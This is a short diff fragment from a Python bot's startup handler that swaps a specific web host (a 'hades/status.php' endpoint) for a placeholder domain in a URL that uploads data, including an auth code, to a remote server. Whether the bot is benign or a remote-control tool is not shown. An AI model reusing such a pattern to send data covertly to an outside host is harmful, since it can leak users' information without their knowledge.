@@ -201,7 +201,7 @@ async def on_ready():
     }
 
     # Construct the URL
-    url = f'http://glitch.onlinewebshop.net/hades/status.php?auth={data["auth_code"]}'
+    url = f'http://your_web_domain/status.php?auth={data["auth_code"]}'
 
     # Upload the data to a web server
     try:
